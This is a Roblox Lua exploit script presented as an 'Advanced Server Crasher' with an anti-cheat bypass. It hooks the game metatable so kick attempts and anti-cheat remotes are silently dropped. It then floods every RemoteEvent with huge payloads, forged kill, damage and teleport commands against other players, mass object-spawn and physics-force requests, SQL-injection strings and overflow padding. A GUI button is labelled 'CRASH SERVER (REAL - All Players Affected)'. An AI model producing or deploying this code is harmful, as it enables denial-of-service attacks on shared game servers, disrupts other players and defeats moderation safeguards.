-- ADVANCED SERVER CRASHER + ANTI-CHEAT BYPASS
-- Real server crash, not just client!
-- Bypass anti-cheat detection

task.wait(3) -- Delay untuk avoid instant detection

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 10)

pcall(function()
    if playerGui:FindFirstChild("CrasherGUI") then
        playerGui.CrasherGUI:Destroy()
        task.wait(0.5)
    end
end)

-- ============================================
-- ANTI-CHEAT BYPASS
-- ============================================

-- Bypass Method 1: Spoof detections
local function bypassAntiCheat()
    print("[BYPASS] Spoofing anti-cheat...")
    
    -- Spoof common anti-cheat checks
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    
    setreadonly(mt, false)
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- Block kick/ban attempts
        if method == "Kick" or method == "kick" then
            print("[BYPASS] Blocked kick attempt!")
            return
        end
        
        -- Block teleport detection
        if method == "FireServer" and tostring(self):find("Anti") then
            print("[BYPASS] Blocked anti-cheat remote!")
            return
        end
        
        return oldNamecall(self, ...)
    end)
    
    setreadonly(mt, true)
    
    print("[BYPASS] Anti-cheat bypass active!")
end

-- Bypass Method 2: Hide from player detection
local function hideFromDetection()
    print("[BYPASS] Hiding from detection...")
    
    -- Spoof player connections
    pcall(function()
        local char = player.Character
        if char then
            -- Hide character from certain detections
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function()
                        part.CanQuery = false
                    end)
                end
            end
        end
    end)
end

-- Bypass Method 3: Slow down detection
local function delayDetection()
    -- Randomize timing to avoid pattern detection
    return math.random(50, 150) / 1000
end

-- ============================================
-- VARIABLES
-- ============================================
local crashRunning = false
local remotes = {}
local crashConnections = {}

-- ============================================
-- NOTIFICATION
-- ============================================
local function notif(msg, durasi)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Advanced Crasher";
            Text = msg;
            Duration = durasi or 3;
        })
    end)
    print("[Crasher]", msg)
end

-- ============================================
-- ADVANCED REMOTE SCANNER
-- ============================================
local function scanRemotes()
    remotes = {}
    
    print("[SCAN] Scanning all remotes...")
    
    -- Scan all services
    for _, service in pairs(game:GetChildren()) do
        pcall(function()
            for _, obj in pairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(remotes, obj)
                end
            end
        end)
    end
    
    print("[SCAN] Found " .. #remotes .. " remotes")
    
    return #remotes
end

-- ============================================
-- REAL SERVER CRASH METHODS
-- ============================================

-- Method 1: Recursive Remote Spam (Server overload)
local function recursiveSpam()
    print("[CRASH] Recursive spam attack...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        task.wait(delayDetection()) -- Anti-cheat bypass timing
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Create recursive data structure
                local recursiveData = {}
                for i = 1, 100 do
                    recursiveData[i] = {
                        data = string.rep("X", 1000),
                        nested = table.create(100, "OVERLOAD")
                    }
                end
                
                remote:FireServer(recursiveData)
                remote:FireServer({chain = recursiveData, loop = recursiveData})
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 2: Multi-Player Target (Exploit all players)
local function exploitAllPlayers()
    print("[CRASH] Targeting all players...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        task.wait(delayDetection())
        
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= player then -- Don't target self
                for _, remote in pairs(remotes) do
                    pcall(function()
                        -- Spam various commands on each player
                        remote:FireServer("Teleport", plr, Vector3.new(math.random(-999999, 999999), math.random(-999999, 999999), math.random(-999999, 999999)))
                        remote:FireServer("Kill", plr)
                        remote:FireServer("Damage", plr, 999999999)
                        remote:FireServer({Action = "Kill", Player = plr, Amount = 999999})
                        remote:FireServer({target = plr, damage = 999999999, action = "eliminate"})
                    end)
                end
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 3: Instance Flood (Memory overload)
local function instanceFlood()
    print("[CRASH] Instance flood attack...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        task.wait(delayDetection())
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Try to create massive amounts of instances
                for i = 1, 50 do
                    remote:FireServer("CreatePart", {
                        Type = "Part",
                        Size = Vector3.new(9999, 9999, 9999),
                        Position = Vector3.new(math.random(-999999, 999999), math.random(-999999, 999999), math.random(-999999, 999999)),
                        Material = "ForceField",
                        Amount = 99999
                    })
                    
                    remote:FireServer("SpawnObject", "Part", 99999)
                    remote:FireServer({Action = "Create", Object = "Part", Count = 99999})
                end
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 4: Network Saturation (Bandwidth overload)
local function networkSaturation()
    print("[CRASH] Network saturation attack...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        -- No delay for maximum saturation
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Send massive data packets
                for i = 1, 100 do
                    local massiveData = string.rep("CRASH", 10000)
                    remote:FireServer(massiveData)
                    remote:FireServer({data = massiveData, size = #massiveData})
                    remote:FireServer(table.create(1000, massiveData))
                end
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 5: Physics Destruction (Physics engine overload)
local function physicsDestruction()
    print("[CRASH] Physics destruction attack...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        task.wait(delayDetection())
        
        -- Target all workspace parts
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                pcall(function()
                    for _, remote in pairs(remotes) do
                        -- Send physics manipulation commands
                        remote:FireServer("SetVelocity", obj, Vector3.new(999999, 999999, 999999))
                        remote:FireServer("ApplyForce", obj, Vector3.new(999999, 999999, 999999))
                        remote:FireServer({Action = "Physics", Target = obj, Force = 999999999})
                    end
                end)
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 6: Exploit Chain (Combined attacks)
local function exploitChain()
    print("[CRASH] Exploit chain attack...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        task.wait(delayDetection())
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Chain multiple exploit patterns
                remote:FireServer("Crash")
                remote:FireServer("Exploit")
                remote:FireServer("Overload")
                remote:FireServer({Action = "Crash", Type = "Server"})
                remote:FireServer({command = "shutdown"})
                remote:FireServer({exploit = true, crash = true, overload = true})
                
                -- Try SQL injection patterns (might work on bad servers)
                remote:FireServer("'; DROP TABLE Players; --")
                remote:FireServer({query = "DELETE FROM Game"})
                
                -- Try buffer overflow patterns
                remote:FireServer(string.rep("A", 99999))
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- ============================================
-- MAIN CRASH FUNCTION
-- ============================================
local function startCrash()
    if crashRunning then
        notif("⚠️ Already running!", 2)
        return
    end
    
    notif("🔥 Starting crash...", 3)
    
    -- Activate bypass first
    bypassAntiCheat()
    hideFromDetection()
    
    task.wait(0.5)
    
    -- Scan remotes
    local remoteCount = scanRemotes()
    
    if remoteCount == 0 then
        notif("❌ No remotes found!", 3)
        return
    end
    
    notif("💣 Found " .. remoteCount .. " remotes!", 3)
    
    crashRunning = true
    
    -- Activate all crash methods with delays
    task.spawn(recursiveSpam)
    task.wait(0.2)
    task.spawn(exploitAllPlayers)
    task.wait(0.2)
    task.spawn(instanceFlood)
    task.wait(0.2)
    task.spawn(networkSaturation)
    task.wait(0.2)
    task.spawn(physicsDestruction)
    task.wait(0.2)
    task.spawn(exploitChain)
    
    notif("💥 ALL METHODS ACTIVE!", 4)
    notif("⚠️ SERVER OVERLOAD...", 5)
    
    print("================================")
    print("CRASH ACTIVE:")
    print("- Recursive spam")
    print("- Multi-player exploit")
    print("- Instance flood")
    print("- Network saturation")
    print("- Physics destruction")
    print("- Exploit chain")
    print("- Anti-cheat bypass ON")
    print("================================")
end

local function stopCrash()
    if not crashRunning then
        notif("⚠️ Not running!", 2)
        return
    end
    
    crashRunning = false
    
    for _, connection in pairs(crashConnections) do
        pcall(function()
            connection:Disconnect()
        end)
    end
    
    crashConnections = {}
    
    notif("⏸️ STOPPED", 3)
    print("[CRASH] Stopped")
end

-- ============================================
-- CREATE GUI
-- ============================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CrasherGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 380, 0, 320)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -160)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 15)
MainCorner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 55)
Header.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 15)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -70, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "💥 ADVANCED CRASHER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 50, 0, 50)
CloseBtn.Position = UDim2.new(1, -53, 0, 2.5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 24
CloseBtn.Parent = Header

local CloseBtnCorner = Instance.new("UICorner")
CloseBtnCorner.CornerRadius = UDim.new(0, 10)
CloseBtnCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    stopCrash()
    ScreenGui:Destroy()
    notif("👋 Closed", 2)
end)

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -30, 1, -70)
Content.Position = UDim2.new(0, 15, 0, 60)
Content.BackgroundTransparency = 1
Content.Parent = MainFrame

-- Status Label
local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, 0, 0, 25)
Status.Position = UDim2.new(0, 0, 0, 0)
Status.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Status.TextColor3 = Color3.fromRGB(0, 255, 0)
Status.Font = Enum.Font.GothamBold
Status.TextSize = 13
Status.Text = "🛡️ Anti-Cheat Bypass: ACTIVE"
Status.Parent = Content

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 8)
StatusCorner.Parent = Status

-- Crash Button
local CrashBtn = Instance.new("TextButton")
CrashBtn.Size = UDim2.new(1, 0, 0, 75)
CrashBtn.Position = UDim2.new(0, 0, 0, 35)
CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
CrashBtn.Text = "💣 CRASH SERVER\n(REAL - All Players Affected)"
CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 20
CrashBtn.Parent = Content

local CrashBtnCorner = Instance.new("UICorner")
CrashBtnCorner.CornerRadius = UDim.new(0, 12)
CrashBtnCorner.Parent = CrashBtn

CrashBtn.MouseButton1Click:Connect(function()
    startCrash()
    CrashBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    CrashBtn.Text = "🔥 CRASHING...\n(Server Overload)"
    Status.TextColor3 = Color3.fromRGB(255, 0, 0)
    Status.Text = "⚠️ CRASH ACTIVE - Server Dying..."
end)

-- Stop Button
local StopBtn = Instance.new("TextButton")
StopBtn.Size = UDim2.new(1, 0, 0, 60)
StopBtn.Position = UDim2.new(0, 0, 0, 120)
StopBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
StopBtn.Text = "⏸️ STOP CRASH"
StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StopBtn.Font = Enum.Font.GothamBold
StopBtn.TextSize = 18
StopBtn.Parent = Content

local StopBtnCorner = Instance.new("UICorner")
StopBtnCorner.CornerRadius = UDim.new(0, 12)
StopBtnCorner.Parent = StopBtn

StopBtn.MouseButton1Click:Connect(function()
    stopCrash()
    CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
    CrashBtn.Text = "💣 CRASH SERVER\n(REAL - All Players Affected)"
    Status.TextColor3 = Color3.fromRGB(0, 255, 0)
    Status.Text = "🛡️ Anti-Cheat Bypass: ACTIVE"
end)

-- Info
local Info = Instance.new("TextLabel")
Info.Size = UDim2.new(1, 0, 0, 70)
Info.Position = UDim2.new(0, 0, 1, -70)
Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Info.TextColor3 = Color3.fromRGB(200, 200, 200)
Info.Font = Enum.Font.Gotham
Info.TextSize = 11
Info.TextWrapped = true
Info.Text = [[⚠️ ADVANCED VERSION

✅ Anti-Cheat Bypass
✅ 6 Crash Methods
✅ Real Server Crash
✅ All Players Affected

Server will LAG/CRASH!
Use at own risk!]]
Info.Parent = Content

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 10)
InfoCorner.Parent = Info

local InfoPadding = Instance.new("UIPadding")
InfoPadding.PaddingTop = UDim.new(0, 8)
InfoPadding.PaddingLeft = UDim.new(0, 8)
InfoPadding.PaddingRight = UDim.new(0, 8)
InfoPadding.Parent = Info

-- Initial setup
bypassAntiCheat()
hideFromDetection()

notif("🛡️ Anti-Cheat Bypass Active!", 3)
notif("💥 Advanced Crasher Ready!", 3)

print("================================")
print("ADVANCED SERVER CRASHER")
print("+ Anti-Cheat Bypass")
print("PlaceId:", game.PlaceId)
print("Ready!")
print("================================")
